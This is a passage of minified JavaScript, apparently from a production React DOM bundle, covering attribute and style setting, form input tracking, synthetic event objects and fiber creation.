l=e.parentNode;l;){if(t=l[xa]||l[We]){if(l=t.alternate,t.child!==null||l!==null&&l.child!==null)for(e=ch(e);e!==null;){if(l=e[We])return l;e=ch(e)}return t}e=l,l=e.parentNode}return null}function va(e){if(e=e[We]||e[xa]){var t=e.tag;if(t===5||t===6||t===13||t===31||t===26||t===27||t===3)return e}return null}function un(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e.stateNode;throw Error(r(33))}function ya(e){var t=e[qc];return t||(t=e[qc]={hoistableStyles:new Map,hoistableScripts:new Map}),t}function Ze(e){e[cn]=!0}var Yc=new Set,Vc={};function Fl(e,t){Sa(e,t),Sa(e+"Capture",t)}function Sa(e,t){for(Vc[e]=t,e=0;e<t.length;e++)Yc.add(t[e])}var pm=RegExp("^[:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD][:A-Z_a-z\\u00C0-\\u00D6\\u00D8-\\u00F6\\u00F8-\\u02FF\\u0370-\\u037D\\u037F-\\u1FFF\\u200C-\\u200D\\u2070-\\u218F\\u2C00-\\u2FEF\\u3001-\\uD7FF\\uF900-\\uFDCF\\uFDF0-\\uFFFD\\-.0-9\\u00B7\\u0300-\\u036F\\u203F-\\u2040]*$"),Pc={},Xc={};function mm(e){return qo.call(Xc,e)?!0:qo.call(Pc,e)?!1:pm.test(e)?Xc[e]=!0:(Pc[e]=!0,!1)}function ps(e,t,l){if(mm(t))if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":e.removeAttribute(t);return;case"boolean":var a=t.toLowerCase().slice(0,5);if(a!=="data-"&&a!=="aria-"){e.removeAttribute(t);return}}e.setAttribute(t,""+l)}}function ms(e,t,l){if(l===null)e.removeAttribute(t);else{switch(typeof l){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(t);return}e.setAttribute(t,""+l)}}function Zt(e,t,l,a){if(a===null)e.removeAttribute(l);else{switch(typeof a){case"undefined":case"function":case"symbol":case"boolean":e.removeAttribute(l);return}e.setAttributeNS(t,l,""+a)}}function Nt(e){switch(typeof e){case"bigint":case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Qc(e){var t=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(t==="checkbox"||t==="radio")}function gm(e,t,l){var a=Object.getOwnPropertyDescriptor(e.constructor.prototype,t);if(!e.hasOwnProperty(t)&&typeof a<"u"&&typeof a.get=="function"&&typeof a.set=="function"){var n=a.get,s=a.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return n.call(this)},set:function(c){l=""+c,s.call(this,c)}}),Object.defineProperty(e,t,{enumerable:a.enumerable}),{getValue:function(){return l},setValue:function(c){l=""+c},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}function Jo(e){if(!e._valueTracker){var t=Qc(e)?"checked":"value";e._valueTracker=gm(e,t,""+e[t])}}function Kc(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var l=t.getValue(),a="";return e&&(a=Qc(e)?e.checked?"true":"false":e.value),e=a,e!==l?(t.setValue(e),!0):!1}function gs(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}var xm=/[\n"\\]/g;function jt(e){return e.replace(xm,function(t){return"\\"+t.charCodeAt(0).toString(16)+" "})}function Wo(e,t,l,a,n,s,c,h){e.name="",c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"?e.type=c:e.removeAttribute("type"),t!=null?c==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+Nt(t)):e.value!==""+Nt(t)&&(e.value=""+Nt(t)):c!=="submit"&&c!=="reset"||e.removeAttribute("value"),t!=null?Fo(e,c,Nt(t)):l!=null?Fo(e,c,Nt(l)):a!=null&&e.removeAttribute("value"),n==null&&s!=null&&(e.defaultChecked=!!s),n!=null&&(e.checked=n&&typeof n!="function"&&typeof n!="symbol"),h!=null&&typeof h!="function"&&typeof h!="symbol"&&typeof h!="boolean"?e.name=""+Nt(h):e.removeAttribute("name")}function Zc(e,t,l,a,n,s,c,h){if(s!=null&&typeof s!="function"&&typeof s!="symbol"&&typeof s!="boolean"&&(e.type=s),t!=null||l!=null){if(!(s!=="submit"&&s!=="reset"||t!=null)){Jo(e);return}l=l!=null?""+Nt(l):"",t=t!=null?""+Nt(t):l,h||t===e.value||(e.value=t),e.defaultValue=t}a=a??n,a=typeof a!="function"&&typeof a!="symbol"&&!!a,e.checked=h?e.checked:!!a,e.defaultChecked=!!a,c!=null&&typeof c!="function"&&typeof c!="symbol"&&typeof c!="boolean"&&(e.name=c),Jo(e)}function Fo(e,t,l){t==="number"&&gs(e.ownerDocument)===e||e.defaultValue===""+l||(e.defaultValue=""+l)}function Aa(e,t,l,a){if(e=e.options,t){t={};for(var n=0;n<l.length;n++)t["$"+l[n]]=!0;for(l=0;l<e.length;l++)n=t.hasOwnProperty("$"+e[l].value),e[l].selected!==n&&(e[l].selected=n),n&&a&&(e[l].defaultSelected=!0)}else{for(l=""+Nt(l),t=null,n=0;n<e.length;n++){if(e[n].value===l){e[n].selected=!0,a&&(e[n].defaultSelected=!0);return}t!==null||e[n].disabled||(t=e[n])}t!==null&&(t.selected=!0)}}function Jc(e,t,l){if(t!=null&&(t=""+Nt(t),t!==e.value&&(e.value=t),l==null)){e.defaultValue!==t&&(e.defaultValue=t);return}e.defaultValue=l!=null?""+Nt(l):""}function Wc(e,t,l,a){if(t==null){if(a!=null){if(l!=null)throw Error(r(92));if(we(a)){if(1<a.length)throw Error(r(93));a=a[0]}l=a}l==null&&(l=""),t=l}l=Nt(t),e.defaultValue=l,a=e.textContent,a===l&&a!==""&&a!==null&&(e.value=a),Jo(e)}function Ta(e,t){if(t){var l=e.firstChild;if(l&&l===e.lastChild&&l.nodeType===3){l.nodeValue=t;return}}e.textContent=t}var bm=new Set("animationIterationCount aspectRatio borderImageOutset borderImageSlice borderImageWidth boxFlex boxFlexGroup boxOrdinalGroup columnCount columns flex flexGrow flexPositive flexShrink flexNegative flexOrder gridArea gridRow gridRowEnd gridRowSpan gridRowStart gridColumn gridColumnEnd gridColumnSpan gridColumnStart fontWeight lineClamp lineHeight opacity order orphans scale tabSize widows zIndex zoom fillOpacity floodOpacity stopOpacity strokeDasharray strokeDashoffset strokeMiterlimit strokeOpacity strokeWidth MozAnimationIterationCount MozBoxFlex MozBoxFlexGroup MozLineClamp msAnimationIterationCount msFlex msZoom msFlexGrow msFlexNegative msFlexOrder msFlexPositive msFlexShrink msGridColumn msGridColumnSpan msGridRow msGridRowSpan WebkitAnimationIterationCount WebkitBoxFlex WebKitBoxFlexGroup WebkitBoxOrdinalGroup WebkitColumnCount WebkitColumns WebkitFlex WebkitFlexGrow WebkitFlexPositive WebkitFlexShrink WebkitLineClamp".split(" "));function Fc(e,t,l){var a=t.indexOf("--")===0;l==null||typeof l=="boolean"||l===""?a?e.setProperty(t,""):t==="float"?e.cssFloat="":e[t]="":a?e.setProperty(t,l):typeof l!="number"||l===0||bm.has(t)?t==="float"?e.cssFloat=l:e[t]=(""+l).trim():e[t]=l+"px"}function Ic(e,t,l){if(t!=null&&typeof t!="object")throw Error(r(62));if(e=e.style,l!=null){for(var a in l)!l.hasOwnProperty(a)||t!=null&&t.hasOwnProperty(a)||(a.indexOf("--")===0?e.setProperty(a,""):a==="float"?e.cssFloat="":e[a]="");for(var n in t)a=t[n],t.hasOwnProperty(n)&&l[n]!==a&&Fc(e,n,a)}else for(var s in t)t.hasOwnProperty(s)&&Fc(e,s,t[s])}function Io(e){if(e.indexOf("-")===-1)return!1;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var vm=new Map([["acceptCharset","accept-charset"],["htmlFor","for"],["httpEquiv","http-equiv"],["crossOrigin","crossorigin"],["accentHeight","accent-height"],["alignmentBaseline","alignment-baseline"],["arabicForm","arabic-form"],["baselineShift","baseline-shift"],["capHeight","cap-height"],["clipPath","clip-path"],["clipRule","clip-rule"],["colorInterpolation","color-interpolation"],["colorInterpolationFilters","color-interpolation-filters"],["colorProfile","color-profile"],["colorRendering","color-rendering"],["dominantBaseline","dominant-baseline"],["enableBackground","enable-background"],["fillOpacity","fill-opacity"],["fillRule","fill-rule"],["floodColor","flood-color"],["floodOpacity","flood-opacity"],["fontFamily","font-family"],["fontSize","font-size"],["fontSizeAdjust","font-size-adjust"],["fontStretch","font-stretch"],["fontStyle","font-style"],["fontVariant","font-variant"],["fontWeight","font-weight"],["glyphName","glyph-name"],["glyphOrientationHorizontal","glyph-orientation-horizontal"],["glyphOrientationVertical","glyph-orientation-vertical"],["horizAdvX","horiz-adv-x"],["horizOriginX","horiz-origin-x"],["imageRendering","image-rendering"],["letterSpacing","letter-spacing"],["lightingColor","lighting-color"],["markerEnd","marker-end"],["markerMid","marker-mid"],["markerStart","marker-start"],["overlinePosition","overline-position"],["overlineThickness","overline-thickness"],["paintOrder","paint-order"],["panose-1","panose-1"],["pointerEvents","pointer-events"],["renderingIntent","rendering-intent"],["shapeRendering","shape-rendering"],["stopColor","stop-color"],["stopOpacity","stop-opacity"],["strikethroughPosition","strikethrough-position"],["strikethroughThickness","strikethrough-thickness"],["strokeDasharray","stroke-dasharray"],["strokeDashoffset","stroke-dashoffset"],["strokeLinecap","stroke-linecap"],["strokeLinejoin","stroke-linejoin"],["strokeMiterlimit","stroke-miterlimit"],["strokeOpacity","stroke-opacity"],["strokeWidth","stroke-width"],["textAnchor","text-anchor"],["textDecoration","text-decoration"],["textRendering","text-rendering"],["transformOrigin","transform-origin"],["underlinePosition","underline-position"],["underlineThickness","underline-thickness"],["unicodeBidi","unicode-bidi"],["unicodeRange","unicode-range"],["unitsPerEm","units-per-em"],["vAlphabetic","v-alphabetic"],["vHanging","v-hanging"],["vIdeographic","v-ideographic"],["vMathematical","v-mathematical"],["vectorEffect","vector-effect"],["vertAdvY","vert-adv-y"],["vertOriginX","vert-origin-x"],["vertOriginY","vert-origin-y"],["wordSpacing","word-spacing"],["writingMode","writing-mode"],["xmlnsXlink","xmlns:xlink"],["xHeight","x-height"]]),ym=/^[\u0000-\u001F ]*j[\r\n\t]*a[\r\n\t]*v[\r\n\t]*a[\r\n\t]*s[\r\n\t]*c[\r\n\t]*r[\r\n\t]*i[\r\n\t]*p[\r\n\t]*t[\r\n\t]*:/i;function xs(e){return ym.test(""+e)?"javascript:throw new Error('React has blocked a javascript: URL as a security precaution.')":e}function Jt(){}var $o=null;function ei(e){return e=e.target||e.srcElement||window,e.correspondingUseElement&&(e=e.correspondingUseElement),e.nodeType===3?e.parentNode:e}var Ea=null,Na=null;function $c(e){var t=va(e);if(t&&(e=t.stateNode)){var l=e[ot]||null;e:switch(e=t.stateNode,t.type){case"input":if(Wo(e,l.value,l.defaultValue,l.defaultValue,l.checked,l.defaultChecked,l.type,l.name),t=l.name,l.type==="radio"&&t!=null){for(l=e;l.parentNode;)l=l.parentNode;for(l=l.querySelectorAll('input[name="'+jt(""+t)+'"][type="radio"]'),t=0;t<l.length;t++){var a=l[t];if(a!==e&&a.form===e.form){var n=a[ot]||null;if(!n)throw Error(r(90));Wo(a,n.value,n.defaultValue,n.defaultValue,n.checked,n.defaultChecked,n.type,n.name)}}for(t=0;t<l.length;t++)a=l[t],a.form===e.form&&Kc(a)}break e;case"textarea":Jc(e,l.value,l.defaultValue);break e;case"select":t=l.value,t!=null&&Aa(e,!!l.multiple,t,!1)}}}var ti=!1;function eu(e,t,l){if(ti)return e(t,l);ti=!0;try{var a=e(t);return a}finally{if(ti=!1,(Ea!==null||Na!==null)&&(no(),Ea&&(t=Ea,e=Na,Na=Ea=null,$c(t),e)))for(t=0;t<e.length;t++)$c(e[t])}}function dn(e,t){var l=e.stateNode;if(l===null)return null;var a=l[ot]||null;if(a===null)return null;l=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(e=e.type,a=!(e==="button"||e==="input"||e==="select"||e==="textarea")),e=!a;break e;default:e=!1}if(e)return null;if(l&&typeof l!="function")throw Error(r(231,t,typeof l));return l}var Wt=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),li=!1;if(Wt)try{var fn={};Object.defineProperty(fn,"passive",{get:function(){li=!0}}),window.addEventListener("test",fn,fn),window.removeEventListener("test",fn,fn)}catch{li=!1}var Al=null,ai=null,bs=null;function tu(){if(bs)return bs;var e,t=ai,l=t.length,a,n="value"in Al?Al.value:Al.textContent,s=n.length;for(e=0;e<l&&t[e]===n[e];e++);var c=l-e;for(a=1;a<=c&&t[l-a]===n[s-a];a++);return bs=n.slice(e,1<a?1-a:void 0)}function vs(e){var t=e.keyCode;return"charCode"in e?(e=e.charCode,e===0&&t===13&&(e=13)):e=t,e===10&&(e=13),32<=e||e===13?e:0}function ys(){return!0}function lu(){return!1}function it(e){function t(l,a,n,s,c){this._reactName=l,this._targetInst=n,this.type=a,this.nativeEvent=s,this.target=c,this.currentTarget=null;for(var h in e)e.hasOwnProperty(h)&&(l=e[h],this[h]=l?l(s):s[h]);return this.isDefaultPrevented=(s.defaultPrevented!=null?s.defaultPrevented:s.returnValue===!1)?ys:lu,this.isPropagationStopped=lu,this}return A(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var l=this.nativeEvent;l&&(l.preventDefault?l.preventDefault():typeof l.returnValue!="unknown"&&(l.returnValue=!1),this.isDefaultPrevented=ys)},stopPropagation:function(){var l=this.nativeEvent;l&&(l.stopPropagation?l.stopPropagation():typeof l.cancelBubble!="unknown"&&(l.cancelBubble=!0),this.isPropagationStopped=ys)},persist:function(){},isPersistent:ys}),t}var Il={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},Ss=it(Il),hn=A({},Il,{view:0,detail:0}),Sm=it(hn),ni,si,pn,As=A({},hn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:ii,button:0,buttons:0,relatedTarget:function(e){return e.relatedTarget===void 0?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==pn&&(pn&&e.type==="mousemove"?(ni=e.screenX-pn.screenX,si=e.screenY-pn.screenY):si=ni=0,pn=e),ni)},movementY:function(e){return"movementY"in e?e.movementY:si}}),au=it(As),Am=A({},As,{dataTransfer:0}),Tm=it(Am),Em=A({},hn,{relatedTarget:0}),oi=it(Em),Nm=A({},Il,{animationName:0,elapsedTime:0,pseudoElement:0}),jm=it(Nm),Cm=A({},Il,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),wm=it(Cm),Rm=A({},Il,{data:0}),nu=it(Rm),Mm={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Dm={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},_m={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function zm(e){var t=this.nativeEvent;return t.getModifierState?t.getModifierState(e):(e=_m[e])?!!t[e]:!1}function ii(){return zm}var Om=A({},hn,{key:function(e){if(e.key){var t=Mm[e.key]||e.key;if(t!=="Unidentified")return t}return e.type==="keypress"?(e=vs(e),e===13?"Enter":String.fromCharCode(e)):e.type==="keydown"||e.type==="keyup"?Dm[e.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:ii,charCode:function(e){return e.type==="keypress"?vs(e):0},keyCode:function(e){return e.type==="keydown"||e.type==="keyup"?e.keyCode:0},which:function(e){return e.type==="keypress"?vs(e):e.type==="keydown"||e.type==="keyup"?e.keyCode:0}}),km=it(Om),Hm=A({},As,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0}),su=it(Hm),Lm=A({},hn,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:ii}),Um=it(Lm),Bm=A({},Il,{propertyName:0,elapsedTime:0,pseudoElement:0}),Gm=it(Bm),qm=A({},As,{deltaX:function(e){return"deltaX"in e?e.deltaX:"wheelDeltaX"in e?-e.wheelDeltaX:0},deltaY:function(e){return"deltaY"in e?e.deltaY:"wheelDeltaY"in e?-e.wheelDeltaY:"wheelDelta"in e?-e.wheelDelta:0},deltaZ:0,deltaMode:0}),Ym=it(qm),Vm=A({},Il,{newState:0,oldState:0}),Pm=it(Vm),Xm=[9,13,27,32],ri=Wt&&"CompositionEvent"in window,mn=null;Wt&&"documentMode"in document&&(mn=document.documentMode);var Qm=Wt&&"TextEvent"in window&&!mn,ou=Wt&&(!ri||mn&&8<mn&&11>=mn),iu=" ",ru=!1;function cu(e,t){switch(e){case"keyup":return Xm.indexOf(t.keyCode)!==-1;case"keydown":return t.keyCode!==229;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function uu(e){return e=e.detail,typeof e=="object"&&"data"in e?e.data:null}var ja=!1;function Km(e,t){switch(e){case"compositionend":return uu(t);case"keypress":return t.which!==32?null:(ru=!0,iu);case"textInput":return e=t.data,e===iu&&ru?null:e;default:return null}}function Zm(e,t){if(ja)return e==="compositionend"||!ri&&cu(e,t)?(e=tu(),bs=ai=Al=null,ja=!1,e):null;switch(e){case"paste":return null;case"keypress":if(!(t.ctrlKey||t.altKey||t.metaKey)||t.ctrlKey&&t.altKey){if(t.char&&1<t.char.length)return t.char;if(t.which)return String.fromCharCode(t.which)}return null;case"compositionend":return ou&&t.locale!=="ko"?null:t.data;default:return null}}var Jm={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function du(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t==="input"?!!Jm[e.type]:t==="textarea"}function fu(e,t,l,a){Ea?Na?Na.push(a):Na=[a]:Ea=a,t=fo(t,"onChange"),0<t.length&&(l=new Ss("onChange","change",null,l,a),e.push({event:l,listeners:t}))}var gn=null,xn=null;function Wm(e){Jf(e,0)}function Ts(e){var t=un(e);if(Kc(t))return e}function hu(e,t){if(e==="change")return t}var pu=!1;if(Wt){var ci;if(Wt){var ui="oninput"in document;if(!ui){var mu=document.createElement("div");mu.setAttribute("oninput","return;"),ui=typeof mu.oninput=="function"}ci=ui}else ci=!1;pu=ci&&(!document.documentMode||9<document.documentMode)}function gu(){gn&&(gn.detachEvent("onpropertychange",xu),xn=gn=null)}function xu(e){if(e.propertyName==="value"&&Ts(xn)){var t=[];fu(t,xn,e,ei(e)),eu(Wm,t)}}function Fm(e,t,l){e==="focusin"?(gu(),gn=t,xn=l,gn.attachEvent("onpropertychange",xu)):e==="focusout"&&gu()}function Im(e){if(e==="selectionchange"||e==="keyup"||e==="keydown")return Ts(xn)}function $m(e,t){if(e==="click")return Ts(t)}function eg(e,t){if(e==="input"||e==="change")return Ts(t)}function tg(e,t){return e===t&&(e!==0||1/e===1/t)||e!==e&&t!==t}var bt=typeof Object.is=="function"?Object.is:tg;function bn(e,t){if(bt(e,t))return!0;if(typeof e!="object"||e===null||typeof t!="object"||t===null)return!1;var l=Object.keys(e),a=Object.keys(t);if(l.length!==a.length)return!1;for(a=0;a<l.length;a++){var n=l[a];if(!qo.call(t,n)||!bt(e[n],t[n]))return!1}return!0}function bu(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function vu(e,t){var l=bu(e);e=0;for(var a;l;){if(l.nodeType===3){if(a=e+l.textContent.length,e<=t&&a>=t)return{node:l,offset:t-e};e=a}e:{for(;l;){if(l.nextSibling){l=l.nextSibling;break e}l=l.parentNode}l=void 0}l=bu(l)}}function yu(e,t){return e&&t?e===t?!0:e&&e.nodeType===3?!1:t&&t.nodeType===3?yu(e,t.parentNode):"contains"in e?e.contains(t):e.compareDocumentPosition?!!(e.compareDocumentPosition(t)&16):!1:!1}function Su(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=gs(e.document);t instanceof e.HTMLIFrameElement;){try{var l=typeof t.contentWindow.location.href=="string"}catch{l=!1}if(l)e=t.contentWindow;else break;t=gs(e.document)}return t}function di(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t==="input"&&(e.type==="text"||e.type==="search"||e.type==="tel"||e.type==="url"||e.type==="password")||t==="textarea"||e.contentEditable==="true")}var lg=Wt&&"documentMode"in document&&11>=document.documentMode,Ca=null,fi=null,vn=null,hi=!1;function Au(e,t,l){var a=l.window===l?l.document:l.nodeType===9?l:l.ownerDocument;hi||Ca==null||Ca!==gs(a)||(a=Ca,"selectionStart"in a&&di(a)?a={start:a.selectionStart,end:a.selectionEnd}:(a=(a.ownerDocument&&a.ownerDocument.defaultView||window).getSelection(),a={anchorNode:a.anchorNode,anchorOffset:a.anchorOffset,focusNode:a.focusNode,focusOffset:a.focusOffset}),vn&&bn(vn,a)||(vn=a,a=fo(fi,"onSelect"),0<a.length&&(t=new Ss("onSelect","select",null,t,l),e.push({event:t,listeners:a}),t.target=Ca)))}function $l(e,t){var l={};return l[e.toLowerCase()]=t.toLowerCase(),l["Webkit"+e]="webkit"+t,l["Moz"+e]="moz"+t,l}var wa={animationend:$l("Animation","AnimationEnd"),animationiteration:$l("Animation","AnimationIteration"),animationstart:$l("Animation","AnimationStart"),transitionrun:$l("Transition","TransitionRun"),transitionstart:$l("Transition","TransitionStart"),transitioncancel:$l("Transition","TransitionCancel"),transitionend:$l("Transition","TransitionEnd")},pi={},Tu={};Wt&&(Tu=document.createElement("div").style,"AnimationEvent"in window||(delete wa.animationend.animation,delete wa.animationiteration.animation,delete wa.animationstart.animation),"TransitionEvent"in window||delete wa.transitionend.transition);function ea(e){if(pi[e])return pi[e];if(!wa[e])return e;var t=wa[e],l;for(l in t)if(t.hasOwnProperty(l)&&l in Tu)return pi[e]=t[l];return e}var Eu=ea("animationend"),Nu=ea("animationiteration"),ju=ea("animationstart"),ag=ea("transitionrun"),ng=ea("transitionstart"),sg=ea("transitioncancel"),Cu=ea("transitionend"),wu=new Map,mi="abort auxClick beforeToggle cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");mi.push("scrollEnd");function Ht(e,t){wu.set(e,t),Fl(t,[e])}var Es=typeof reportError=="function"?reportError:function(e){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var t=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof e=="object"&&e!==null&&typeof e.message=="string"?String(e.message):String(e),error:e});if(!window.dispatchEvent(t))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",e);return}console.error(e)},Ct=[],Ra=0,gi=0;function Ns(){for(var e=Ra,t=gi=Ra=0;t<e;){var l=Ct[t];Ct[t++]=null;var a=Ct[t];Ct[t++]=null;var n=Ct[t];Ct[t++]=null;var s=Ct[t];if(Ct[t++]=null,a!==null&&n!==null){var c=a.pending;c===null?n.next=n:(n.next=c.next,c.next=n),a.pending=n}s!==0&&Ru(l,n,s)}}function js(e,t,l,a){Ct[Ra++]=e,Ct[Ra++]=t,Ct[Ra++]=l,Ct[Ra++]=a,gi|=a,e.lanes|=a,e=e.alternate,e!==null&&(e.lanes|=a)}function xi(e,t,l,a){return js(e,t,l,a),Cs(e)}function ta(e,t){return js(e,null,null,t),Cs(e)}function Ru(e,t,l){e.lanes|=l;var a=e.alternate;a!==null&&(a.lanes|=l);for(var n=!1,s=e.return;s!==null;)s.childLanes|=l,a=s.alternate,a!==null&&(a.childLanes|=l),s.tag===22&&(e=s.stateNode,e===null||e._visibility&1||(n=!0)),e=s,s=s.return;return e.tag===3?(s=e.stateNode,n&&t!==null&&(n=31-xt(l),e=s.hiddenUpdates,a=e[n],a===null?e[n]=[t]:a.push(t),t.lane=l|536870912),s):null}function Cs(e){if(50<qn)throw qn=0,jr=null,Error(r(185));for(var t=e.return;t!==null;)e=t,t=e.return;return e.tag===3?e.stateNode:null}var Ma={};function og(e,t,l,a){this.tag=e,this.key=l,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.refCleanup=this.ref=null,this.pendingProps=t,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=a,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function vt(e,t,l,a){return new og(e,t,l,a)}function bi(e){return e=e.prototype,!(!e||!e.isReactComponent)}function Ft(e,t){var l=e.alternate;return l===null?(l=vt(e.tag,t,e.key,e.mode),l.elementType=e.elementType,l.type=e.type,l.stateNode=e.stateNode,l.alternate=e,e.alternate=l):(l.pendingProps=t,l.type=e.type,l.flags=0,l.subtreeFlags=0,l.deletions=null),l.flags=e.flags&65011712,l.childLanes=e.childLanes,l.lanes=e.lanes,l.child=e.child,l.memoizedProps=e.memoizedProps,l.memoizedState=e.memoizedState,l.updateQueue=e.updateQueue,t=e.dependencies,l.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext},l.sibling=e.sibling,l.index=e.index,l.ref=e.ref,l.refCleanup=e.refCleanup,l}function Mu(e,t){e.flags&=65011714;var l=e.alternate;return l===null?(e.childLanes=0,e.lanes=t,e.child=null,e.subtreeFlags=0,e.memoizedProps=null,e.memoizedState=null,e.updateQueue=null,e.dependencies=null,e.stateNode=null):(e.childLanes=l.childLanes,e.lanes=l.lanes,e.child=l.child,e.subtreeFlags=0,e.deletions=null,e.memoizedProps=l.memoizedProps,e.memoizedState=l.memoizedState,e.updateQueue=l.updateQueue,e.type=l.type,t=l.dependencies,e.dependencies=t===null?null:{lanes:t.lanes,firstContext:t.firstContext}),e}function ws(e,t,l,a,n,s){var c=0;if(a=e,typeof e=="function")bi(e)&&(c=1);else if(typeof e=="string")c=dx(e,l,Y.current)?26:e==="html"||e==="head"||e==="body"?27:5;else e:switch(e){case Ee:return e=vt(31,l,t,n),e.elementType=Ee,e.lanes=s,e;case L:return la(l.children,n,s,t);case H:c=8,n|=24;break;case Z:return e=vt(12,l,t,n|2),e.elementType=Z,e.lanes=s,e;case ee:return e=vt(13,l,t,n),e.elementType=ee,e.lanes=s,e;case ue:return e=vt(19,l,t,n),e.elementType=ue,e.lanes=s,e;default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case J:c=10;break e;case I:c=9;break e;case se:c=11;break e;case F:c=14;break e;case P:c=16,a=null;break e}c=29,l=Error(r(130,e===null?"null":typeof e,"")),a=null}return t=vt(c,l,t,n),t.elementType=e,t.type=a,t.lanes=s,t}function la(e,t,l,a){return e=vt(7,e,a,t),e.lanes=l,e}function vi(e,t,l){return e=vt(6,e,null,t),e.lanes=l,e}function Du(e){var t=vt(18,null,null,0);return t.stateNode=e,t}function yi(e,t,l){return t=vt(4,e.children!==null?e.children:[],e.key,t),t.lanes=l,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}var _u=new WeakMap;function wt(e,t){if(typeof e=="object"&&e!==null){var l=_u.get(e);return l!==void 0?l:(t={value:e,source:t,stack:Dc(t)},_u.set(e,t),t)}return{value:e,source:t,stack:Dc(t)}}var Da=[],_a=0,Rs=null,yn=0,Rt=[],Mt=0,Tl=null,Yt=1,Vt="";function It(e,t){Da[_a++]=yn,Da[_a++]=Rs,Rs=e,yn=t}function zu(e,t,l){Rt[Mt++]=Yt,Rt[Mt++]=Vt,Rt[Mt++]=Tl,Tl=e;var a=Yt;e=Vt;var n=32-xt(a)-1;a&=~(1<<n),l+=1;var s=32-xt(t)+n;if(30<s){var c=n-n%5;s=(a&(1<<c)-1).toString(32),a>>=c,n-=c,Yt=1<<32-xt(t)+n|l<<n|a,Vt=s+e}else Yt=1<<s|l<<n|a,Vt=e}function Si(e){e.return!==null&&(It(e,1),zu(e,1,0))}function 